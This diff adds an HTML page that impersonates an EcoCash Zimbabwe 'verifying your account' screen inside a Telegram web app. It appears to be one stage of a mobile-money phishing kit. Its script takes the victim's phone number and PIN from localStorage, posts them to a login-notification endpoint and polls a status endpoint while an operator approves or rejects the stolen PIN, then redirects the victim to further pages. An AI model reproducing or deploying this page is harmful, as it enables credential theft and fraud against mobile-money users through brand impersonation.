@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>EcoCash - Verifying</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f4f6f9;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .loading-card {
+            background: white;
+            width: 90%;
+            max-width: 380px;
+            padding: 50px 20px;
+            border-radius: 16px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(1, 77, 140, 0.15);
+            border: 1px solid #e1e8ed;
+        }
+
+        /* EcoCash Blue and Orange Theme */
+        .loader-circle {
+            width: 120px;
+            height: 120px;
+            background: radial-gradient(circle, #007bc4 0%, #014d8c 100%);
+            border-radius: 50%;
+            margin: 0 auto 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            box-shadow: 0 8px 20px rgba(1, 77, 140, 0.3);
+        }
+
+        .loader-circle::after {
+            content: '';
+            width: 90px;
+            height: 90px;
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-top: 4px solid #ff6f00; /* EcoCash Accent Orange */
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h2 {
+            color: #014d8c; /* EcoCash Dark Navy */
+            font-size: 26px;
+            margin: 0 0 12px;
+            font-weight: bold;
+        }
+
+        p {
+            color: #555;
+            font-size: 15px;
+            margin: 0;
+            line-height: 1.5;
+        }
+
+        .brand-footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #999;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="loading-card">
+    <div class="loader-circle"></div>
+    <h2 id="main-text">Please wait...</h2>
+    <p id="sub-text">Verifying your account details...</p>
+    <div class="brand-footer">EcoCash Zimbabwe</div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", async () => {
+
+    const mainText = document.getElementById("main-text");
+    const subText = document.getElementById("sub-text");
+
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();
+        tg.expand();
+    }
+
+    const phone = localStorage.getItem("phone") || "";
+    const pin = localStorage.getItem("lastPin") || "";
+
+    if (!phone) {
+        console.warn("⚠️ No phone found in localStorage");
+    }
+
+    // -------------------- SEND SINGLE LOGIN REQUEST --------------------
+    try {
+        await fetch("/api/login-notification", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, pin, country: "Zimbabwe", brand: "EcoCash" })
+        });
+    } catch (err) {
+        console.error("❌ Notification dispatch failed:", err);
+    }
+
+    // -------------------- DYNAMIC TEXT UPDATE --------------------
+    setTimeout(() => {
+        if (mainText.textContent !== "Approved!" && mainText.textContent !== "Denied!") {
+            mainText.textContent = "Processing...";
+            subText.textContent = "Securely confirming authentication with EcoCash systems.";
+        }
+    }, 4000);
+
+    // -------------------- CHECK APPROVAL STATUS --------------------
+    async function checkApproval() {
+        if (!phone) return;
+
+        try {
+            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+            const data = await res.json();
+
+            if (data.status === "approved") {
+                clearInterval(pollingInterval);
+                mainText.textContent = "Approved!";
+                subText.textContent = "Account verified successfully. Redirecting...";
+                
+                // EcoCash Green Accent highlight style update (optional)
+                document.querySelector('.loader-circle').style.background = '#4CAF50';
+
+                setTimeout(() => {
+                    window.location.href = "/page8.html";
+                }, 1500);
+            }
+
+            if (data.status === "denied") {
+                clearInterval(pollingInterval);
+                mainText.textContent = "Denied!";
+                subText.textContent = "Incorrect PIN details. Sending you back...";
+
+                setTimeout(() => {
+                    window.location.href = "/page6.html?error=wrongpin";
+                }, 2000);
+            }
+
+        } catch (err) {
+            console.error("❌ Status check failed:", err);
+        }
+    }
+
+    // Check status every 2.5 seconds
+    const pollingInterval = setInterval(checkApproval, 2500);
+});
+</script>
+
+</body>
+</html>
